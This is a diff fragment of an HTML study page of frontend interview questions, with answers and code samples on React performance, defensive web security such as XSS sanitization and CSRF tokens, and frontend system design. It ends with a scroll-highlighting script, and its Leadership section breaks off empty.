+                        avoid re-rendering children when parent state changes.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Prevent re-render if props haven't changed
+const MemoizedComponent = React.memo(MyComponent);
+
+// Prevent function recreation
+const handleClick = useCallback(() => {
+  console.log('Clicked');
+}, []);</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Slow Component Loading -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. How do you handle slow component loading?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Code Splitting and Lazy Loading.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Use <code>React.lazy()</code> and <code>Suspense</code> to load components only when needed. Show
+                        a skeleton loader or spinner while loading to improve Perceived Performance.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>import React, { Suspense } from 'react';
+const HeavyComponent = React.lazy(() => import('./HeavyComponent'));
+
+function App() {
+  return (
+    &lt;Suspense fallback={&lt;Spinner /&gt;}&gt;
+      &lt;HeavyComponent /&gt;
+    &lt;/Suspense&gt;
+  );
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. Virtualization -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. What is List Virtualization?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Rendering only the items currently visible in the viewport.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>If you have a list of 10,000 items, rendering them all will crash the browser. Virtualization
+                        (using libraries like <code>react-window</code> or <code>react-virtualized</code>) keeps the DOM
+                        size constant regardless of list length.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>import { FixedSizeList } from 'react-window';
+
+const Row = ({ index, style }) => (
+  &lt;div style={style}&gt;Row {index}&lt;/div&gt;
+);
+
+&lt;FixedSizeList height={150} itemCount={1000} itemSize={35} width={300}&gt;
+  {Row}
+&lt;/FixedSizeList&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. AbortController -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. How do you cancel a pending API request?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Using the <code>AbortController</code> API.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Pass <code>signal: controller.signal</code> to fetch. Call <code>controller.abort()</code> in the
+                        cleanup function of <code>useEffect</code> to cancel the request if the component unmounts or
+                        dependencies change (preventing Race Conditions).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>useEffect(() => {
+  const controller = new AbortController();
+  
+  fetch('/api/data', { signal: controller.signal })
+    .then(res => res.json())
+    .then(setData);
+
+  return () => controller.abort(); // Cancel on unmount
+}, []);</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Bundle Size -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. How do you analyze and reduce bundle size?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Use tools like <code>webpack-bundle-analyzer</code> or <code>source-map-explorer</code>.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Identify large libraries (e.g., Lodash, Moment.js) and replace them with lighter alternatives or
+                        use Tree Shaking. Ensure you are not importing unused code.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Bad (Imports entire library)
+import * as _ from 'lodash';
+
+// Good (Tree Shaking enabled)
+import { debounce } from 'lodash';</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Debounce vs Throttle -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. Debounce vs Throttle?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Debounce:</strong> Wait for silence (e.g., search input). <strong>Throttle:</strong> Limit
+                    execution rate (e.g., scroll event).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Debounce executes only after the user stops triggering the event for X ms. Throttle executes at
+                        most once every X ms, regardless of how many times the event is triggered.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Debounce (Search)
+// User types 'h', 'e', 'l', 'l', 'o' -> API called once after 'o'
+
+// Throttle (Scroll)
+// User scrolls for 5 seconds -> Event fires every 100ms (50 times)</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. React Profiler -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. What is the React Profiler?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A tool to measure the "cost" of rendering.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It helps identify which components are rendering, why they are rendering, and how long they take.
+                        It's crucial for spotting performance bottlenecks.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>&lt;Profiler id="App" onRender={(id, phase, actualDuration) => {
+  console.log({ id, phase, actualDuration });
+}}&gt;
+  &lt;App /&gt;
+&lt;/Profiler&gt;</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- System Design Section -->
+        <section id="system-design" class="chapter">
+            <h2 class="chapter-title">Frontend System Design</h2>
+            <!-- 1. Web Performance -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. How do you optimize Web Performance?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Minimizing load time and improving responsiveness. Key metrics are Core Web Vitals (LCP, FID, CLS).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Strategies:</p>
+                    <ul>
+                        <li><strong>Code Splitting:</strong> Load only necessary JS.</li>
+                        <li><strong>Image Optimization:</strong> Use WebP, lazy loading, and proper sizing.</li>
+                        <li><strong>Caching:</strong> Service Workers, HTTP caching headers.</li>
+                        <li><strong>Minification & Compression:</strong> Gzip/Brotli.</li>
+                        <li><strong>CDN:</strong> Serve assets closer to the user.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>import { getLCP, getFID, getCLS } from 'web-vitals';
+
+getCLS(console.log);
+getFID(console.log);
+getLCP(console.log);</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. Security (XSS, CSRF) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. Explain XSS and CSRF and how to prevent them.</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>XSS (Cross-Site Scripting):</strong> Injecting malicious scripts. <strong>CSRF (Cross-Site
+                        Request Forgery):</strong> Tricking a user into performing unwanted actions.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Prevent XSS:</strong> Sanitize inputs, use Content Security Policy (CSP), escape
+                            data (React does this by default).</li>
+                        <li><strong>Prevent CSRF:</strong> Use Anti-CSRF tokens, SameSite cookie attribute.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Sanitize HTML before rendering
+import DOMPurify from 'dompurify';
+
+const clean = DOMPurify.sanitize(dirtyInput);
+document.getElementById('div').innerHTML = clean;</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. Micro-frontends -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. What are Micro-frontends?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    An architectural style where a frontend app is decomposed into individual, semi-independent
+                    "microapps" working loosely together.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Allows different teams to work on different features independently, potentially using different
+                        tech stacks. Implemented via IFrames, Web Components, or Module Federation (Webpack 5).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Webpack Module Federation
+new ModuleFederationPlugin({
+  name: 'app1',
+  remotes: {
+    app2: 'app2@http://localhost:3002/remoteEntry.js',
+  },
+});</code></pre>
+                </div>
+            </div>
+
+            <!-- 4. CI/CD -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">4. Explain CI/CD in Frontend Development.</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>CI (Continuous Integration):</strong> Automating tests and builds on every commit.
+                    <strong>CD (Continuous Deployment):</strong> Automating release to production.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>A typical pipeline: Lint -> Unit Tests -> Build -> E2E Tests -> Deploy to Staging -> Deploy to
+                        Production. Tools: GitHub Actions, Jenkins, CircleCI.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code># GitHub Actions Workflow
+name: CI
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - run: npm install
+      - run: npm test
+      - run: npm run build</code></pre>
+                </div>
+            </div>
+
+            <!-- 5. Testing Strategies -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">5. What is the Testing Pyramid?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A strategy for balancing different types of tests.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Unit Tests (Base):</strong> Fast, cheap, test individual functions/components
+                            (Jest).</li>
+                        <li><strong>Integration Tests (Middle):</strong> Test how components work together.</li>
+                        <li><strong>E2E Tests (Top):</strong> Slow, expensive, test full user flows (Cypress,
+                            Playwright).</li>
+                    </ul>
+                    <p>You should have many unit tests, fewer integration tests, and very few E2E tests.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Unit Test (Jest)
+test('adds 1 + 2 to equal 3', () => {
+  expect(sum(1, 2)).toBe(3);
+});
+
+// E2E Test (Playwright)
+test('login flow', async ({ page }) => {
+  await page.goto('/login');
+  await page.fill('#username', 'user');
+  await page.click('#submit');
+  await expect(page).toHaveURL('/dashboard');
+});</code></pre>
+                </div>
+            </div>
+
+            <!-- 6. Folder Structure -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">6. How do you structure a large React application?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Feature-based grouping is generally better than file-type grouping for scalability.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Instead of <code>/components</code>, <code>/actions</code>, <code>/reducers</code>, group by
+                        feature: <code>/features/auth</code>, <code>/features/profile</code>. Each feature folder
+                        contains its own components, slice, and API logic (Colocation).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>src/
+  features/
+    auth/
+      AuthSlice.ts
+      LoginComponent.tsx
+      authAPI.ts
+    products/
+      ProductList.tsx
+      productAPI.ts
+  components/ (Shared)
+    Button.tsx
+  hooks/ (Shared)</code></pre>
+                </div>
+            </div>
+
+            <!-- 7. Authentication -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">7. JWT vs Session Authentication?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Session:</strong> Server stores state. Client sends cookie ID. <strong>JWT (JSON Web
+                        Token):</strong> Stateless. Client stores token (usually in memory or cookie) and sends it in
+                    header.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>JWT is better for microservices and mobile apps. Session is simpler and easier to invalidate
+                        (logout) on the server side.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// JWT Header
+Authorization: Bearer &lt;token&gt;
+
+// Session Cookie
+Cookie: sessionId=&lt;id&gt;</code></pre>
+                </div>
+            </div>
+
+            <!-- 8. CORS -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">8. What is CORS?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Cross-Origin Resource Sharing. A security feature that restricts web pages from making requests to a
+                    different domain than the one that served the web page.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>The <em>server</em> must send specific headers (<code>Access-Control-Allow-Origin</code>) to
+                        allow the browser to accept the response.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Server Response Header
+Access-Control-Allow-Origin: https://my-app.com
+Access-Control-Allow-Methods: GET, POST, PUT</code></pre>
+                </div>
+            </div>
+
+            <!-- 9. PWA -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. What makes a Progressive Web App (PWA)?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A web app that behaves like a native app.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Key requirements: HTTPS, Service Worker (offline support), Web App Manifest (installable on home
+                        screen).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// manifest.json
+{
+  "name": "My PWA",
+  "short_name": "PWA",
+  "start_url": "/",
+  "display": "standalone",
+  "icons": [...]
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 10. Accessibility Auditing -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. How do you audit a website for Accessibility?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Using automated tools and manual testing.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Automated:</strong> Lighthouse, axe-core, WAVE.</li>
+                        <li><strong>Manual:</strong> Keyboard navigation (Tab key), Screen Readers (NVDA, VoiceOver),
+                            Color Contrast checkers.</li>
+                    </ul>
+                </div>
+                <div class="code-example">
+                    <pre><code>// axe-core usage
+import axe from 'axe-core';
+
+axe.run(document, (err, results) => {
+  if (results.violations.length) {
+    console.log('Accessibility violations:', results.violations);
+  }
+});</code></pre>
+                </div>
+            </div>
+
+            <!-- 11. Edge Computing -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">11. Edge Computing vs Cloud Functions?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Cloud Functions:</strong> Run in centralized data centers (e.g., us-east-1). <strong>Edge
+                        Functions:</strong> Run on servers closest to the user (CDN nodes).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Edge functions have lower latency (no cold starts usually) but often have a more limited runtime
+                        environment (e.g., V8 isolate instead of full Node.js).</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Edge Middleware (Next.js)
+import { NextResponse } from 'next/server';
+
+export function middleware(request) {
+  const country = request.geo.country;
+  if (country === 'US') {
+    return NextResponse.rewrite(new URL('/us-home', request.url));
+  }
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- 12. Serverless -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">12. Pros and Cons of Serverless for Frontend?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Pros:</strong> Scalability, pay-per-use, no server management. <strong>Cons:</strong> Cold
+                    starts, vendor lock-in, debugging complexity.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Serverless is ideal for "BFF" (Backend for Frontend) layers in Next.js/Remix apps but requires
+                        careful architectural planning to avoid "function spaghetti".</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Leadership Section -->
+        <section id="leadership" class="chapter">
+            <h2 class="chapter-title">Leadership & Behavioral</h2>
+            <!-- 1. Conflict Resolution -->
+            <div class="question-card">
+                <div class="question-header">
+
+                    <script>
+                        // Active Link Highlighting
+                        const sections = document.querySelectorAll('section');
+                        const navLinks = document.querySelectorAll('.nav-links a');
+
+                        window.addEventListener('scroll', () => {
+                            let current = '';
+                            sections.forEach(section => {
+                                const sectionTop = section.offsetTop;
+                                const sectionHeight = section.clientHeight;
+                                if (pageYOffset >= (sectionTop - 200)) {
+                                    current = section.getAttribute('id');
+                                }
+                            });
+
+                            navLinks.forEach(link => {
+                                link.classList.remove('active');
+                                if (link.getAttribute('href').includes(current)) {
+                                    link.classList.add('active');
+                                }
+                            });
+
+                            // Back to top button
+                            const backToTop = document.querySelector('.back-to-top');
+                            if (window.scrollY > 500) {
+                                backToTop.classList.add('visible');
+                            } else {
+                                backToTop.classList.remove('visible');
+                            }
+                        });
+                    </script>
+</body>
+
+</html>
